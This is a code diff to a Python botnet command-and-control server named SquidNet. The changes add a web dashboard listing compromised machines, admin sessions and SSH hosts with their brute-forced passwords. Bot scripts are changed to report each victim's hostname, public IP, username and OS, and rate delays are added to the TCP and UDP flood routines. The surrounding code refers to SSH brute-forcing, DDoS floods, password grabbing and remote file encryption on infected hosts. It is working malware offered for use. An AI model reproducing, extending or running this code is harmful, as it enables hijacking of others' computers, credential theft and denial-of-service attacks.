@@ -37,14 +37,14 @@ tar -xf {os.getcwd()}/ngrok.zip
         Allows the user to know what the arguements do as well as well as
         how to use them."""
         print("""
-  _____             _     _ _   _      _           _____  _____ 
- / ____|           (_)   | | \ | |    | |         | ____|| ____|
-| (___   __ _ _   _ _  __| |  \| | ___| |_  __   _| |__  | |__  
- \___ \ / _` | | | | |/ _` | . ` |/ _ \ __| \ \ / /___ \ |___ \ 
- ____) | (_| | |_| | | (_| | |\  |  __/ |_   \ V / ___) | ___) |
-|_____/ \__, |\__,_|_|\__,_|_| \_|\___|\__|   \_/ |____(_)____/ 
-           | |                                                  
-           |_|                                                                                                                                     
+  _____             _     _ _   _      _             __   ___  
+ / ____|           (_)   | | \ | |    | |           / /  / _ \ 
+| (___   __ _ _   _ _  __| |  \| | ___| |_  __   __/ /_ | | | |
+ \___ \ / _` | | | | |/ _` | . ` |/ _ \ __| \ \ / / '_ \| | | |
+ ____) | (_| | |_| | | (_| | |\  |  __/ |_   \ V /| (_) | |_| |
+|_____/ \__, |\__,_|_|\__,_|_| \_|\___|\__|   \_/  \___(_)___/ 
+           | |                                                 
+           |_|                                                                                                                                                     
 TCP and SSH Botnet Hybrid Command and Control Server By DrSquid
 
 [+] Option-Parsing Help:
@@ -138,6 +138,7 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid
         else:
             ngrokport = None
         self.botnet = Botnet(ip, port, adminuser, adminpass, key, passfile, ngrokhost, ngrokport)
+        self.webinterface = Web_Interface("localhost", 8080)
 class Botnet:
     """Main Class Made for the BotNet. Everything important
     and needed for the Botnet is located in this class."""
@@ -155,7 +156,11 @@ class Botnet:
         self.name = name
         self.passw = passw
         self.key = key
+        self.info = []
+        self.ssh_info = []
+        self.admininfo = []
         self.bot_count = 0
+        self.passfilename = passwfile
         self.logfile = "servlog.txt"
         self.log("\n" + self.log_logo() + "\n")
         self.log("\n[(SERVER)]: Starting up server....")
@@ -197,6 +202,7 @@ class Botnet:
         item = f"\n[(SERVER)]: Server started: {datetime.datetime.today()}\n[(SERVER)]: Successfully started server on: {self.ngroklink}:{self.ngrokport}\n[(SERVER)]: Listening for connections.....\n[(SERVER)]: Encryption key used: {self.key}"
         self.log(item)
         print(f"\n[+] Hosting Server at {self.ngroklink}:{self.ngrokport}")
+        print("[+] Web-Interface Successfully Created: http://127.0.0.1:8080")
         print("[+] Botnet is Up! Listening for connections.....\n")
         print(f"[+] This Server is being logged!\n[+] Server Log File: {self.logfile}")
         print(f"\n[+] Use this token when encrypting!: {key}")
@@ -208,14 +214,14 @@ class Botnet:
     def log_logo(self):
         """Logo of this script."""
         logo = """
-  _____             _     _ _   _      _           _____  _____ 
- / ____|           (_)   | | \ | |    | |         | ____|| ____|
-| (___   __ _ _   _ _  __| |  \| | ___| |_  __   _| |__  | |__  
- \___ \ / _` | | | | |/ _` | . ` |/ _ \ __| \ \ / /___ \ |___ \ 
- ____) | (_| | |_| | | (_| | |\  |  __/ |_   \ V / ___) | ___) |
-|_____/ \__, |\__,_|_|\__,_|_| \_|\___|\__|   \_/ |____(_)____/ 
-           | |                                                  
-           |_|                                                                                                                                    
+  _____             _     _ _   _      _             __   ___  
+ / ____|           (_)   | | \ | |    | |           / /  / _ \ 
+| (___   __ _ _   _ _  __| |  \| | ___| |_  __   __/ /_ | | | |
+ \___ \ / _` | | | | |/ _` | . ` |/ _ \ __| \ \ / / '_ \| | | |
+ ____) | (_| | |_| | | (_| | |\  |  __/ |_   \ V /| (_) | |_| |
+|_____/ \__, |\__,_|_|\__,_|_| \_|\___|\__|   \_/  \___(_)___/ 
+           | |                                                 
+           |_|                                                                                                                              
 TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
         return logo
     def logo(self):
@@ -306,11 +312,31 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
                 flag = 0
                 self.serv.listen(1)
                 c, ip = self.serv.accept()
-                hostname = c.recv(1024).decode().strip()
+                msg = c.recv(1024).decode().strip()
                 self.bot_count += 1
+                split_msg = msg.split()
+                hostname = split_msg[0]
+                try:
+                    ipaddr = str(split_msg[1])
+                except:
+                    ipaddr = "Unknown"
+                try:
+                    user = str(split_msg[2])
+                except:
+                    user = "Unknown"
+                try:
+                    connection = str(ip[1])
+                except:
+                    connection = "Unknown"
+                try:
+                    opsys = split_msg[3]
+                except:
+                    opsys = "Unknown"
+                info = str(hostname+" "+ipaddr+" "+user+" "+connection+" "+opsys)
+                self.info.append(info)
                 print(f"\n[!] {hostname} has connected to the botnet.")
                 self.log(f"\n[(CONNECTION)]: {hostname} has connected to the botnet.")
-                handle = threading.Thread(target=self.handler, args=(c, hostname, self.bot_count))
+                handle = threading.Thread(target=self.handler, args=(c, hostname, self.bot_count, info))
                 handle.start()
             except Exception as e:
                 self.log(f"\n[(ERROR)]: {str(e)}")
@@ -328,7 +354,7 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
             self.serverlog = open(self.logfile, "w")
             self.serverlog.write(msg)
             self.serverlog.close()
-    def handler(self, c, hostname, number):
+    def handler(self, c, hostname, number, info):
         """Function recieves packets from the connections. This is needed for clients
         to send packets to the botnet so the Admin can see what the Bots are sending.
         This is needed also for password grabbing and information obtaining. This
@@ -434,6 +460,7 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
                                 self.admin_conn.append(c)
                                 c.send(self.welcomemsg.encode())
                                 self.log(f"\n[(SERVER---->({hostname}))]: Sent welcome message.")
+                                self.admininfo.append(info)
                             else:
                                 c.send("Access Denied!".encode())
                                 msgtoall = f"[(ATTEMPTEDBREACHWARNING)]: {hostname} attempted to login to the botnet with incorrect credentials!\n[(ATTEMPTEDBREACHWARNING)]: Closing Connection...."
@@ -597,6 +624,7 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
             self.ips.append(ip)
             self.display_bots.append(f"{username}@{ip}")
             self.ssh_bots.append(client)
+            self.ssh_info.append(str(username) + " " + str(ip) + " " + str(passw))
             self.ssh_botlist.append(str(client) + ' ' + str(username))
             msgtoadmin = f"[(SERVER)]: {ip}'s Password has been found!: {password}\n[(SERVER)] Adding {username}@{ip} to the botnet.\n"
             self.log('\n' + msgtoadmin)
@@ -638,6 +666,7 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
                 self.ips.append(ip)
                 self.display_bots.append(f"{username}@{ip}")
                 self.ssh_bots.append(client)
+                self.ssh_info.append(str(username)+" "+str(ip)+" "+str(passw))
                 self.ssh_botlist.append(str(client) + ' ' + str(username))
                 msgtoadmin = f"[(SERVER)]: {ip}'s Password has been found!: {passw}\n[(SERVER)] Adding {username}@{ip} to the botnet.\n"
                 self.log('\n' + msgtoadmin)
@@ -823,6 +852,7 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
 [+] - Added UDP Flooding
 [+] - Added Bot file editing.
 [+] - Added Bot file creation.
+[+] - Added Web-Interface(http://127.0.0.1:8080)!
 [+] - Optimized the code a little.
 [+] - Added Rick Roll command.
                     """)
@@ -843,14 +873,15 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
     def gen_admin(self):
         """Generates the admin for remote admin connections to the BotNet."""
         script = """
-import socket, threading, os, time
+import socket, threading, os, time, urllib.request, sys
 class BotMaster:
     def __init__(self, ip, port, name, admin_password):
         self.ip = ip
         self.port = port
         self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.client.connect((self.ip, self.port))
-        self.client.send(socket.gethostname().encode())
+        msg = str(socket.gethostname() + " " + self.getip() + " " + os.getlogin()+" "+sys.platform).encode()
+        self.client.send(msg)
         self.name = name
         self.admin_password = admin_password
         time.sleep(1)
@@ -876,6 +907,20 @@ class BotMaster:
            | |                                            
            |_|                                                                                                      
 SquidNet Admin Script By DrSquid''')
+    def getip(self):
+        try:
+            url = 'https://httpbin.org/ip'
+            req = urllib.request.Request(url)
+            result = urllib.request.urlopen(req)
+            try:
+                result = result.read().decode()
+            except:
+                result = result.read()
+            contents = result.split()
+            ip = contents[2].strip('"')
+            return ip
+        except:
+            pass
     def send(self):
         while True:
             try:
@@ -899,7 +944,9 @@ SquidNet Admin Script By DrSquid''')
                     try:
                         self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                         self.client.connect((self.ip, self.port))
-                        self.client.send(socket.gethostname().encode())
+                        msg = str(
+                            socket.gethostname() + " " + self.getip() + " " + os.getlogin() + " " + sys.platform).encode()
+                        self.client.send(msg)
                         time.sleep(1)
                         self.client.send("!CLIENTLOG".encode())
                         time.sleep(1)
@@ -4245,6 +4292,7 @@ class TCP_UDP_Flood:
                 tcp_req.start()
                 if self.stop:
                     break
+                time.sleep(self.delay)
             except:
                 pass
     def UDP_Flood(self):
@@ -4254,6 +4302,7 @@ class TCP_UDP_Flood:
                 udp_req.start()
                 if self.stop:
                     break
+                time.sleep(self.delay)
             except:
                 pass
 class Bot:
@@ -4267,7 +4316,8 @@ class Bot:
         self.connection.connect((self.ip, self.port))
         self.fileeditor = False
         time.sleep(1)
-        self.send(socket.gethostname())
+        msg = socket.gethostname()+" "+self.getip()+" "+os.getlogin()+" "+sys.platform
+        self.send(msg)
         time.sleep(1)
         self.send("!CLIENTLOG")
         self.recv_thr = threading.Thread(target=self.recv)
@@ -4471,7 +4521,8 @@ OS:       {sys.platform}
                     try:
                         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                         self.connection.connect((self.ip, self.port))
-                        self.send(socket.gethostname())
+                        msg = socket.gethostname() + " " + self.getip() + " " + os.getlogin() + " " + sys.platform
+                        self.send(msg)
                         time.sleep(1)
                         self.send("!CLIENTLOG".encode())
                         time.sleep(1)
@@ -4665,7 +4716,7 @@ OS:       {sys.platform}
                         for i in range(10):
                             os.system("open https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstleyVEVO")
                     self.send("Just got rick rolled!".encode())
-                                elif self.msg.startswith("!tcpflood"):
+                elif self.msg.startswith("!tcpflood"):
                     msg_split = self.msg.split()
                     ip = msg_split[1]
                     try:
@@ -4712,6 +4763,142 @@ key = """ + str(self.key) + """
 bot = Bot(ip, port, key)
         """
         return script
+class Web_Interface:
+    """Web Interface for seeing connections, some general info about them, and also
+    info about this script. There are some important info about some of the important
+    variables in the server, so that the User can learn more about it."""
+    def __init__(self, ip, port):
+        """Initiation of the server, also where all the important variables are defined,
+        as well as the starting of the server and threads."""
+        self.ip = "localhost"
+        self.port = port
+        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.server.bind((ip, port))
+        self.packet = ""
+        self.listener = threading.Thread(target=self.listen)
+        self.listener.start()
+        self.packetmaker = threading.Thread(target=self.packetmaker)
+        self.packetmaker.start()
+    def packetmaker(self):
+        """This function generates the packet to send
+        to the client."""
+        while True:
+            try:
+                conn_bots = ""
+                for x in botnet.botnet.info:
+                    conn_bots += '<tr>\n<td>' + x.split()[0] + '</td>\n<td>' + x.split()[1] + "</td>\n<td>" + x.split()[
+                        2] + "</td>\n<td>" + x.split()[3] + "</td>\n<td>"+x.split()[4]+"</td>\n</tr>\n"
+                conn_admin = ""
+                for x in botnet.botnet.admininfo:
+                    conn_admin += '<tr>\n<td>' + x.split()[0] + '</td>\n<td>' + x.split()[1] + "</td>\n<td>" + x.split()[
+                        2] + "</td>\n<td>" + x.split()[3] + "</td>\n<td>"+x.split()[4]+"</td>\n</tr>\n"
+                conn_ssh = ""
+                for x in botnet.botnet.ssh_info:
+                    conn_ssh += '<tr>\n<td>' + x.split()[0] + '</td>\n<td>' + x.split()[1] + "</td>\n<td>" + x.split()[
+                        2] + "</td>\n</tr>\n"
+                self.packet = """
+                <!DOCTYPE html>
+                <html lang="en">
+                <meta charset="UTF-8">
+                <head>
+                <style>
+                        table {
+                            border: 3px solid black;
+                            font-size: 50px
+                            border-collapse: collapse;
+                            font: arial;
+
+                        }
+
+                        td, th {
+                            border: 1px solid black;
+                            padding: 5px;
+
+                        }
+
+                    </style>
+                </head>
+                <body>
+                <h1>SquidNet Web Interface<h1>
+                <h3>(Clearly HTML is not my base language so it doesn't look too good)<h3>
+                <h1>Connections To the Botnet<h1>
+                <table>
+                <thead>
+                <tr>
+                <th>Hostname</th>
+                <th>IP Address</th>
+                <th>UserName</th>
+                <th>Connection</th>
+                <th>OS</th>
+                </tr>
+                </thead>
+                <tbody>
+                """ + str(conn_bots) + """
+                </tbody>
+                </table>
+                <h1>Admin Connections To the Botnet<h1>
+                <table>
+                <thead>
+                <tr>
+                <th>Hostname</th>
+                <th>IP Address</th>
+                <th>UserName</th>
+                <th>Connection</th>
+                <th>OS</th>
+                </tr>
+                </thead>
+                <tbody>
+                """+str(conn_admin)+"""
+                </tbody>
+                </table>
+                <h1>SSH Connections to the Botnet</h1>
+                <table>
+                <thead>
+                <tr>
+                <th>Hostname</th>
+                <th>IP Address</th>
+                <th>Password</th>
+                </tr>
+                </thead>
+                <tbody>
+                """+str(conn_ssh)+"""
+                </tbody>
+                </table>
+                <h1></h1>
+                <h2>About:</h2>
+                </h4>Squidnet is an SSH and TCP Botnet Hybrid. The Botnet has the ability to take control of computers compromised by the
+                bot script, as well as gaining access to ssh servers. It also has a form of security in which admins need to provide a username and
+                a password in order to gain access. They will be kicked if they do not enter the correct credentials. The Bots can do many
+                things including DDoS Attacks(HTTP, TCP and UDP Floods), sending their passwords to the Botnet, editing files remotely,
+                and many more.</h4>
+                <h2>Important Info</h2>
+                <h4>Server Log file: """+os.getcwd()+"""\\servlog.txt - Good for checking for errors and server output.</h4>
+                <h4>Server IP: """+str(botnet.botnet.ngroklink)+""":"""+str(botnet.botnet.ngrokport)+""" - How Bots will connect to the Botnet.</h4>
+                <h4>Admin Username: """+str(botnet.botnet.admin_name)+""" - Username Used by Admins to obtain access to the Botnet</h4>
+                <h4>Admin Password: """+str(botnet.botnet.passw)+""" - Password Used by Admins to obtain access to the Botnet.</h4>
+                <h4>Encryption Token: """+str(botnet.botnet.key)+""" - Used for encrypting files on the bots.</h4>
+                <h4>Brute-Forcing-File: """+str(botnet.botnet.passfilename)+""" - Used for SSH-Brute-Forcing.</h4>
+                </body>
+                </html>
+                            """
+            except Exception as e:
+                pass
+    def listen(self):
+        """Listens for and accepts connections."""
+        while True:
+            self.server.listen()
+            conn, ip = self.server.accept()
+            handler = threading.Thread(target=self.handler, args=(conn,))
+            handler.start()
+    def handler(self, conn):
+        """Handles the connections and sends the HTTP Code to the client
+        to view the Web Interface."""
+        conn.send('HTTP/1.0 200 OK\n'.encode())
+        conn.send('Content-Type: text/html\n'.encode())
+        conn.send('\n'.encode())
+        conn.send(self.packet.encode())
+        conn.close()
+
 if sys.platform == "win32":
     os.system("cls")
 else:
